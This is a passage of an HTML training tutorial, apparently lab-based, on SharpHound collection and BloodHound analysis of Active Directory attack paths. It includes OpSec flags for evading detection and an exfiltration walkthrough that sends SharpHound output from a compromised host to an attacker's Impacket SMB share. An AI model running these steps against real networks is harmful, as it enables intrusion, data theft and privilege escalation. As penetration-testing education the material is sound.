+                    The option <code>-collectionmethod</code> or <code>-c</code> allows us to specify exactly what kind of data we want to collect. Below are descriptions of the primary method shortcuts:
+                </p>
+                <ul class="list-disc list-inside ml-4 text-gray-600 space-y-2 mb-6">
+                    <li><b>All:</b> Performs all collection methods except <code>GPOLocalGroup</code>.</li>
+                    <li><b>DCOnly:</b> Collects data only from the domain controller and will not try to get data from domain-joined Windows devices. It will collect users, computers, security group memberships, domain trusts, abusable permissions on AD objects, OU structure, Group Policy, and the most relevant AD object properties. It will attempt to correlate Group Policy-enforced local groups to affected computers.</li>
+                    <li><b>ComputerOnly:</b> This is the opposite of DCOnly. It will only collect information from domain-joined computers, such as user sessions and local groups.</li>
+                </ul>
+
+                <h4 class="text-lg font-bold text-gray-800 mt-6 mb-3">Commonly Used Operational Flags</h4>
+                <p class="text-gray-600 mb-4">
+                    These flags allow for authenticated collection with alternate credentials and targeted scanning:
+                </p>
+                <ul class="list-disc list-inside ml-4 text-gray-600 space-y-2">
+                    <li>If we get credentials from a user other than the context from which we are running, we can use the <code>--ldapusername</code> and <code>--ldappassword</code> options to run SharpHound using those credentials.</li>
+                    <li>Another flag we find helpful is <code>-d</code> or <code>--domain</code>. Although this option is often assigned by default, if we are in an environment where multiple domains exist, we can use this option to ensure that SharpHound will collect the information from the domain we specify.</li>
+                    <li>SharpHound will capture the domain controller automatically, but if we want to target a specific DC, we can use the option <code>--domaincontroller</code> followed by the IP or FQDN of the target domain controller. This option could help us target a forgotten or secondary domain, which may have less security or monitoring tools than the primary domain controller. Another use case for this flag is if we are doing port forwarding, we can specify an IP and port to target. We can use the flag <code>--ldapport</code> to select a port.</li>
+                </ul>
+
+                <h4 class="text-lg font-bold text-gray-800 mt-6 mb-3">Randomize and Hide SharpHound Output (OpSec)</h4>
+                <p class="text-gray-600 mb-4">
+                    Defense teams could use predictable output patterns (filenames, location) to detect BloodHound activity. Use these options to maintain a low profile:
+                </p>
+
+                <div class="overflow-x-auto">
+                    <table class="min-w-full divide-y divide-gray-300">
+                        <thead>
+                            <tr class="bg-gray-100 text-gray-800">
+                                <th class="px-6 py-3 text-left text-sm font-medium">Option</th>
+                                <th class="px-6 py-3 text-left text-sm font-medium">Description</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-gray-200">
+                            <tr class="bg-white">
+                                <td class="px-6 py-4 code-font">--memcache</td>
+                                <td class="px-6 py-4 text-gray-700">Keep cache in memory and don’t write temporary files to disk.</td>
+                            </tr>
+                            <tr class="bg-gray-50">
+                                <td class="px-6 py-4 code-font">--randomfilenames</td>
+                                <td class="px-6 py-4 text-gray-700">Generate random filenames for output, including the zip file.</td>
+                            </tr>
+                            <tr class="bg-white">
+                                <td class="px-6 py-4 code-font">--outputprefix</td>
+                                <td class="px-6 py-4 text-gray-700">String to prepend to output file names.</td>
+                            </tr>
+                            <tr class="bg-gray-50">
+                                <td class="px-6 py-4 code-font">--outputdirectory</td>
+                                <td class="px-6 py-4 text-gray-700">Directory to output file to.</td>
+                            </tr>
+                            <tr class="bg-white">
+                                <td class="px-6 py-4 code-font">--zipfilename</td>
+                                <td class="px-6 py-4 text-gray-700">Filename for the zip.</td>
+                            </tr>
+                            <tr class="bg-gray-50">
+                                <td class="px-6 py-4 code-font">--zippassword</td>
+                                <td class="px-6 py-4 text-gray-700">Password protects the zip with the specified password.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <!-- END Randomize/OpSec -->
+                
+                <!-- START NEW SECTION: Advanced Data Exfiltration (Remote Upload) -->
+                <h4 class="text-lg font-bold text-gray-800 mt-8 mb-3 border-b pb-2">Advanced Data Exfiltration (Remote SMB Upload)</h4>
+                <p class="text-gray-600 mb-4">
+                    In live engagements, you often want the SharpHound output immediately transferred back to your attacker machine. This can be achieved by setting up a malicious **SMB share** on the attacker's machine (e.g., using Impacket) and configuring SharpHound to output directly to that remote share.
+                </p>
+
+                <h5 class="font-bold text-gray-800 mt-4 mb-2">Step 1: Start the Shared Folder on the Attacker Machine (Linux/Kali)</h5>
+                <p class="text-sm text-gray-600">Start the Impacket <code>smbserver.py</code>, creating a share named 'share' with temporary credentials. Assume the attacker's IP is <code>10.10.14.33</code>.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="kali@kali:~/htb$ ">sudo impacket-smbserver share ./ -smb2support -user test -password test</div>
+                    <pre class="terminal-output text-sm text-green-200">Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed  </pre>
+                </div>
+
+                <h5 class="font-bold text-gray-800 mt-4 mb-2">Step 2: Connect to the Shared Folder from the Compromised Host (Windows)</h5>
+                <p class="text-sm text-gray-600">Use <code>net use</code> on the target Windows machine to map the share using the defined credentials. This confirms connectivity.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-yellow-400 terminal-prompt" data-prompt="C:\htb> ">net use \\10.10.14.33\share /user:test test</div>
+                    <pre class="terminal-output text-sm text-green-200">The command completed successfully.</pre>
+                </div>
+
+                <h5 class="font-bold text-gray-800 mt-4 mb-2">Step 3: Run SharpHound to Output Directly to the Share</h5>
+                <p class="text-sm text-gray-600">Combine the <code>--outputdirectory</code> flag with the remote UNC path and OpSec flags for a clean collection and exfiltration in one step.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-yellow-400 terminal-prompt" data-prompt="C:\htb> ">C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames</div>
+                    <pre class="terminal-output text-sm text-green-200">2023-01-11T11:31:43.4459137-06:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
+2023-01-11T11:31:43.5998704-06:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-01-11T11:31:43.6311043-06:00|INFORMATION|Initializing SharpHound at 11:31 AM on 1/11/2023
+...
+2023-01-11T11:31:55.2710788-06:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.HTB
+... (Output continues, resulting in a zip file saved on the attacker's machine)</pre>
+                </div>
+                
+                <h5 class="font-bold text-gray-800 mt-4 mb-2">Step 4: Retrieve and Unzip the File on the Attacker Machine</h5>
+                <p class="text-sm text-gray-600">Once the execution completes on the target, you can immediately unzip the file on your local machine using the password defined with <code>--zippassword</code>.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="kali@kali:~/htb$ ">unzip ./HTB_20230111113143_5yssigbd.w3f</div>
+                    <pre class="terminal-output text-sm text-green-200">Archive:  ./HTB_20230111113143_5yssigbd.w3f
+[./HTB_20230111113143_5yssigbd.w3f] HTB_20230111113143_hjclkslu.2in password:
+  inflating: HTB_20230111113143_hjclkslu.2in
+  inflating: HTB_20230111113143_hk3lxtz3.1ku
+  inflating: HTB_20230111113143_kghttiwp.jbq
+  inflating: HTB_20230111113143_kdg5svst.4sc
+  inflating: HTB_20230111113143_qeugxqep.lya
+  inflating: HTB_20230111113143_xsxzlxht.awa
+  inflating: HTB_20230111113143_51zkhw0e.bth</pre>
+                </div>
+                <p class="text-lg text-gray-800 mt-6 font-semibold">Now we can upload our data to BloodHound (see Section 4: Analysis).</p>
+                <!-- END Advanced Data Exfiltration -->
+            </div>
+        </section>
+
+        <!-- Data Analysis Section (Renumbered) -->
+        <section id="analysis" class="mb-16 pt-10 -mt-10">
+            <!-- CHANGED TO CYAN-700 -->
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">4. Analysis: Importing and Querying Data</h2>
+            <p class="text-gray-600 mb-6">
+                Once the Neo4j service is running and you have your data, you can launch the BloodHound GUI (client) to start your analysis.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Importing Data into BloodHound</h3>
+
+                <div class="mb-6 bg-blue-50 p-4 rounded-lg border-l-4 border-blue-600 flex flex-col sm:flex-row items-center justify-between gap-4">
+                    <div>
+                        <p class="font-bold text-blue-800">Need sample data?</p>
+                        <p class="text-sm text-blue-700">Download the example dataset to follow along with this guide.</p>
+                    </div>
+                    <a href="https://raw.githubusercontent.com/hossamshady11/resources/refs/heads/main/bloodhound1.zip" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition duration-150 ease-in-out text-sm flex items-center whitespace-nowrap">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                        Download Example
+                    </a>
+                </div>
+                
+                <ol class="step-list">
+                    <li>
+                        <div class="w-full">
+                            <p class="font-semibold text-gray-800 mb-1">Start the Neo4j Database Service</p>
+                            <p class="text-sm text-gray-600">If the service isn't already running, start it from an elevated terminal:</p>
+                            <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                <div class="text-green-400 terminal-prompt">net start neo4j</div>
+                                <pre class="terminal-output text-sm text-green-200">The Neo4j Graph Database - neo4j service is starting..
+The Neo4j Graph Database - neo4j service was started successfully.</pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="w-full">
+                            <p class="font-semibold text-gray-800 mb-1">Launch and Log In to the BloodHound Client</p>
+                            <p class="text-sm text-gray-600">Launch the client and log in using the credentials you set during Phase B of the installation (e.g., <code>C:\Tools\BloodHound\BloodHound.exe</code>).</p>
+                            <div class="bg-gray-100 p-3 rounded-lg border-l-4 border-yellow-600 mt-2">
+                                <p class="text-sm text-gray-700"><b>Username: neo4j</b> and <b>Password: Password123</b></p>
+                            </div>
+                            <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound10.png" alt="Screenshot of the BloodHound login window" onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+10+Unavailable'" loading="lazy" class="mt-4">
+                        </div>
+                    </li>
+                    <li>
+                        <div class="w-full">
+                            <p class="font-semibold text-gray-800 mb-1">Upload the SharpHound Zip File</p>
+                            <p class="text-sm text-gray-600">Click the **Upload Data** icon (the small upload button on the far right of the BloodHound interface), browse to your SharpHound zip file (e.g., <code>20250101100016_BloodHound.zip</code>), and upload it. You will see a status bar showing the upload progress.</p>
+                            <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound11.jpg" alt="Screenshot showing the upload status in BloodHound." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+11+Unavailable'" loading="lazy" class="mt-4">
+                            <div class="bg-yellow-100 p-3 rounded-lg border-l-4 border-yellow-600 mt-4">
+                                <p class="font-semibold text-yellow-700">Note on Duplicates:</p>
+                                <p class="text-gray-700 text-sm">We can upload as many zip files as we want. BloodHound will not duplicate the data but will add any new data not already present in the database (e.g., from a more recent collection). If computer names do not appear correctly after the first import, re-importing the file often corrects this issue.</p>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Initial Data Exploration</h3>
+                
+                <!-- NEW SECTION: Graph Drawing Area -->
+                <h4 class="text-lg font-bold text-gray-800 mt-6 mb-3">The Graph Drawing Area (Interactive Visualization)</h4>
+                <div class="bg-white p-4 rounded-lg border border-gray-300 mb-4">
+                    <p class="text-sm text-gray-600 mb-4">
+                        This area is known as the **Graph Drawing Area**, where BloodHound displays nodes and their relationship using edges. We can interact with the graph, move objects, zoom in or zoom out (with the mouse scroll or the bottom right buttons), click on nodes to see more information, or right-click them to perform different actions.
+                    </p>
+                    
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound14.gif" alt="GIF demonstrating interaction in the BloodHound Graph Drawing Area." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+14+Unavailable'" loading="lazy" class="mb-4">
+
+                    <div class="overflow-x-auto mt-4">
+                        <h5 class="font-bold text-gray-800 mb-2">Right-Click Context Menu Options (Nodes):</h5>
+                        <table class="min-w-full divide-y divide-gray-300">
+                            <thead>
+                                <tr class="bg-gray-100 text-gray-800">
+                                    <th class="px-6 py-3 text-left text-sm font-bold">Command</th>
+                                    <th class="px-6 py-3 text-left text-sm font-bold">Description</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200">
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">Set as Starting Node</td>
+                                    <td class="px-6 py-4 text-gray-700">Set this node as the starting point in the pathfinding tool. Click this, and you will see this node’s name in the search bar. Then, you can select another node to target after clicking the pathfinding button.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">Set as Ending Node</td>
+                                    <td class="px-6 py-4 text-gray-700">Set this node as the target node in the pathfinding tool.</td>
+                                </tr>
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">Shortest Paths to Here</td>
+                                    <td class="px-6 py-4 text-gray-700">This will perform a query to find all shortest paths from any arbitrary node in the database to this node. This may cause a long query time in Neo4j and an even longer render time in the BloodHound GUI.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">Shortest Paths to Here from Owned</td>
+                                    <td class="px-6 py-4 text-gray-700">Find attack paths to this node from any node you have marked as owned.</td>
+                                </tr>
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">Edit Node</td>
+                                    <td class="px-6 py-4 text-gray-700">This brings up the node editing modal, where you can edit current properties on the node or even add our custom properties to the node.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">Mark Group as Owned</td>
+                                    <td class="px-6 py-4 text-gray-700">This will internally set the node as owned in the Neo4j database, which you can then use in conjunction with other queries such as “Shortest paths to here from Owned”.</td>
+                                </tr>
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">Mark/Unmark Group as High Value</td>
+                                    <td class="px-6 py-4 text-gray-700">Some nodes are marked as “high value” by default, such as the domain admins group and enterprise admin group. We can use this with other queries, suchs as “shortest paths to high-value assets”.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">Delete Node</td>
+                                    <td class="px-6 py-4 text-gray-700">Deletes the node from the Neo4j database.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h5 class="font-bold text-gray-800 mt-6 mb-2">Keyboard Shortcuts:</h5>
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full divide-y divide-gray-300">
+                            <thead>
+                                <tr class="bg-gray-100 text-gray-800">
+                                    <th class="px-6 py-3 text-left text-sm font-bold">Shortcut</th>
+                                    <th class="px-6 py-3 text-left text-sm font-bold">Description</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200">
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">CTRL</td>
+                                    <td class="px-6 py-4 text-gray-700">Pressing <b>CTRL</b> will cycle through the three different node label display settings: default, always show, and always hide.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">Spacebar</td>
+                                    <td class="px-6 py-4 text-gray-700">Pressing the <b>Spacebar</b> will bring up the spotlight window, which lists all currently drawn nodes. Click an item in the list, and the GUI will zoom into and briefly highlight that node.</td>
+                                </tr>
+                                <tr class="bg-white">
+                                    <td class="px-6 py-4 code-font">Backspace</td>
+                                    <td class="px-6 py-4 text-gray-700">Pressing <b>Backspace</b> will return to the previous graph result rendering. This is the same functionality as clicking the Back button in the search bar.</td>
+                                </tr>
+                                <tr class="bg-gray-50">
+                                    <td class="px-6 py-4 code-font">S</td>
+                                    <td class="px-6 py-4 text-gray-700">Pressing the letter <b>S</b> will toggle the expansion or collapse of the information panel below the search bar. This is the same functionality as clicking the More Info button in the search bar.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <h5 class="font-bold text-gray-800 mt-6 mb-2">Interacting with Edges: The Help Menu</h5>
+                    <p class="text-sm text-gray-600 mb-4">
+                        The **Graph Drawing Area** also lets us interact with **Edges**. They represent the link between two nodes and help us understand how we will move from one object to another. As BloodHound has many edges, it is challenging to keep track of how we can abuse every single one. The BloodHound team included a **help menu** under edges, where we can see information, examples, and references on how to abuse every single edge.
+                    </p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound14.png" alt="GIF demonstrating interaction with BloodHound edge help menu." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+15+Unavailable'" loading="lazy" class="mb-4">
+
+                </div>
+                <!-- END Graph Drawing Area -->
+                
+                <!-- NEW SECTION: Search Bar -->
+                <h4 class="text-lg font-bold text-gray-800 mt-8 mb-3 border-b pb-2">Search Bar Mastery</h4>
+                <div class="bg-white p-4 rounded-lg border border-gray-300 mb-4">
+                    <p class="text-gray-600 mb-4">
+                        The **Search Bar** is one of the elements of BloodHound that we will use the most. We can search for specific objects by their name or by using type prefixes to narrow the results. If we click on a node we searched, its information will be displayed immediately in the Node Info tab.
+                    </p>
+                    <h5 class="font-bold text-gray-800 mb-2">Node Type Prefixes:</h5>
+                    <p class="text-gray-600 mb-4">
+                        If we want to search for a specific type, we can prepend our search with the node type, for example, <code>user:peter</code> or <code>group:domain</code>. Let’s see this in action:
+                    </p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound16.gif" alt="GIF demonstrating using type prefixes in the BloodHound search bar." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+16+Unavailable'" loading="lazy" class="mt-4">
+                
+                    <h5 class="font-bold text-gray-800 mt-6 mb-2 border-t pt-4">Pathfinding</h5>
+                    <p class="text-gray-600 mb-4">
+                        Another great feature in the search bar is **Pathfinding**. We can use it to find an attack path between two given nodes. This is the core capability that highlights non-obvious relationships.
+                    </p>
+                    <p class="text-gray-600 mb-2">
+                        For example, we can look for an attack path from the user **ryan** to **Domain Admins**. The initial path result is:
+                        <code class="code-font font-bold text-red-500 block p-2 bg-slate-100 rounded-md my-2">Ryan &gt; Mark &gt; HelpDesk &gt; ITSecurity &gt; Domain Admins</code>
+                    </p>
+                    <p class="text-gray-600 mb-4">
+                        This path contains the edge **ForceChangePassword**. Let’s say we want to avoid changing users’ passwords. We can use the filter option, uncheck **ForceChangePassword**, and search for the path without this edge. The new, longer, but safer path result is:
+                        <code class="code-font font-bold text-green-500 block p-2 bg-slate-100 rounded-md my-2">Ryan &gt; AddSelf &gt; Tech_Support &gt; Testinggroup &gt; HelpDesk &gt; ITSecurity &gt; Domain Admins</code>
+                    </p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound17.gif" alt="GIF demonstrating pathfinding and filtering edges in BloodHound." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+17+Unavailable'" loading="lazy" class="mt-4">
+                </div>
+                <!-- END Search Bar -->
+
+
+                <p class="text-gray-600 mb-4 mt-6">
+                    Once the upload is complete, we can begin analyzing the data. To view general information about the domain, type the domain name into the search box (e.g., **Domain:INLANEFREIGHT.HTB**). Clicking the resulting icon will display statistics about the node, including the count of users, groups, computers, and OUs.
+                </p>
+                
+                <div class="bg-white p-4 rounded-lg border border-gray-300">
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound13.jpg" alt="BloodHound interface showing node information panel." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+13+Unavailable'" loading="lazy" class="mb-4">
+                    <p class="text-sm text-gray-600">The **Node Info** panel on the right side of the screen displays comprehensive details about the selected object (node), including its properties, membership relationships, and abusable access control lists (ACLs).</p>
+                </div>
+                
+                <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound12.jpg" alt="BloodHound interface showing domain node details." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+12+Unavailable'" loading="lazy" class="mt-4">
+                
+                <p class="text-lg text-gray-800 mt-6 font-semibold">
+                    Now, we can start analyzing the information in BloodHound and find the shortest attack paths to our high-value targets.
+                </p>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Running Core Queries</h3>
+                <p class="text-gray-600 mb-4">
+                    BloodHound provides a set of powerful pre-built queries to quickly find common attack paths and points of interest.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-gray-100 p-3 rounded-lg">
+                        <p class="font-bold text-indigo-700">Shortest Path to Domain Admins</p>
+                        <p class="text-sm text-gray-700">Identifies the fastest path from any controllable entity to DA.</p>
+                    </div>
+                    <div class="bg-gray-100 p-3 rounded-lg">
+                        <p class="font-bold text-indigo-700">Users with Sessions on Domain Admins</p>
+                        <p class="text-sm text-gray-700">Finds low-privilege users who are currently logged into DA-controlled systems, making them prime targets for credential theft.</p>
+                    </div>
+                    <div class="bg-gray-100 p-3 rounded-lg">
+                        <p class="font-bold text-indigo-700">Kerberoastable Users</p>
+                        <p class="text-sm text-gray-700">Lists users with Service Principal Names (SPNs) that allow their password hashes to be easily extracted offline.</p>
+                    </div>
+                    <div class="bg-gray-100 p-3 rounded-lg">
+                        <p class="font-bold text-indigo-700">High Value Targets</p>
+                        <p class="text-sm text-gray-700">Pre-defined query for finding high-value users, computers, and groups with weak access controls.</p>
+                    </div>
+                </div>
+
+                <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-purple-600 mt-6">
+                    <p class="font-semibold text-purple-700">Cypher Query Language:</p>
+                    <p class="text-gray-700 text-sm">BloodHound uses <b>Cypher</b> (the Neo4j query language) for custom searches. For example, to find all users with Administrator privileges on a specific computer:</p>
+                    <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 text-sm text-white code-block-wrapper">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <span class="text-yellow-400">MATCH p = shortestPath((n:User)-[*1..]->(c:Computer {name: 'TARGET-PC.DOMAIN.LOCAL'})) WHERE (n)-[:AdminTo]->(c) RETURN p</span>
+                    </div>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Database Info and Management</h3>
+                <p class="text-gray-600 mb-4">
+                    The **BloodHound Database Info** tab gives users a quick overview of their current Neo4j database status. Here, users can view the database’s number of sessions, relationships, ACLs, Azure objects and relationships, and Active Directory Objects.
+                </p>
+                <p class="text-gray-600 mb-4">
+                    Additionally, there are several options available for managing the database:
+                </p>
+                <div class="overflow-x-auto">
+                    <table class="min-w-full divide-y divide-gray-300">
+                        <thead>
+                            <tr class="bg-gray-100 text-gray-800">
+                                <th class="px-6 py-3 text-left text-sm font-bold">Option</th>
+                                <th class="px-6 py-3 text-left text-sm font-bold">Description</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-gray-200">
+                            <tr class="bg-white">
+                                <td class="px-6 py-4 code-font">Clear Database</td>
+                                <td class="px-6 py-4 text-gray-700">Lets users completely clear the database of all nodes, relationships, and properties. This can be useful when starting a new assessment or dealing with outdated data.</td>
+                            </tr>
+                            <tr class="bg-gray-50">
+                                <td class="px-6 py-4 code-font">Clear Sessions</td>
+                                <td class="px-6 py-4 text-gray-700">Lets users clear all saved sessions from the database.</td>
+                            </tr>
+                            <tr class="bg-white">
+                                <td class="px-6 py-4 code-font">Refresh Database Stats</td>
+                                <td class="px-6 py-4 text-gray-700">Updates the displayed statistics to reflect any changes made to the database.</td>
+                            </tr>
+                            <tr class="bg-gray-50">
+                                <td class="px-6 py-4 code-font">Warming Up Database</td>
+                                <td class="px-6 py-4 text-gray-700">Is a process that puts the entire database into memory, which can significantly speed up queries. However, this process can take some time to complete, especially if the database is large.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <!-- START NEW SECTION: Export, Import, and Upload Buttons -->
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Utility Buttons: Export, Import, and Upload</h3>
+                <p class="text-gray-600 mb-4">
+                    The top-right corner of the BloodHound interface contains several utility buttons for managing your graph data and the display:
+                </p>
+
+                <div class="space-y-4">
+                    <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-blue-500">
+                        <h4 class="font-bold text-blue-700 mb-2">Export Graph & Image</h4>
+                        <p class="text-gray-700 text-sm mb-4">
+                            **Export Graph:** Saves the current graph view in **JSON format** so it can be imported later for sharing or backup. We can also save the current graph as a picture in **PNG format** for documentation.
+                        </p>
+                        <p class="text-gray-700 text-sm mb-2">
+                            **Import Graph:** We can display the JSON formatted graph we previously exported.
+                        </p>
+                        <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound18.gif" alt="GIF demonstrating graph export and import options in BloodHound." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+18+Unavailable'" loading="lazy" class="mt-4">
+                    </div>
+                    
+                    <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-green-500">
+                        <h4 class="font-bold text-green-700 mb-2">Upload Data</h4>
+                        <p class="text-gray-700 text-sm mb-4">
+                            **Upload Data:** Uploads SharpHound, BloodHound.py, or AzureHound data to the Neo4j database. We can select the upload data with the dedicated upload button or **drag and drop** the JSON or zip file directly into the BloodHound window.
+                        </p>
+                        <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound19.gif" alt="GIF demonstrating the drag-and-drop file upload feature in BloodHound." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+19+Unavailable'" loading="lazy" class="mt-4">
+                    </div>
+                </div>
+                <!-- END NEW SECTION: Export, Import, and Upload Buttons -->
+
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="bg-slate-900 border-t border-slate-700 mt-16 text-white py-12">
+        <div class="container mx-auto px-4 flex flex-col items-center">
+            <h3 class="text-xl font-semibold mb-4 tracking-wide text-white">Our Partners</h3>
+            <div class="w-full max-w-5xl">
+                <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 items-center justify-items-center gap-8 mb-8">
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="AISEC">
+                        <img alt="AISEC" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://rednexus.academy/assets/aisec-CPMZqhQs.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=AISEC'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="GDG">
+                        <img alt="GDG" class="mx-auto object-contain min-h-[110px] sm:min-h-[130px] md:min-h-[150px] max-h-[140px] sm:max-h-[160px] md:max-h-[180px] max-w-[200px] sm:max-w-[240px] md:max-w-[260px] w-auto" src="https://rednexus.academy/assets/gdg-Df6L4Ii3.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=GDG'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="Green Armor">
+                        <img alt="Green Armor" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://rednexus.academy/assets/greenarmor-oZ_OwdCW.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=Green+Armor'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="INE">
+                        <img alt="INE" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://ine.com/assets/logos/INE-Logo-Orange-White-Revised.svg" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=INE'">
+                    </a>
+                </div>
+            </div>
+            <div class="w-20 h-[2px] bg-white/40 mx-auto mb-6 rounded-full"></div>
+            <div class="flex justify-center gap-6 text-2xl mb-3">
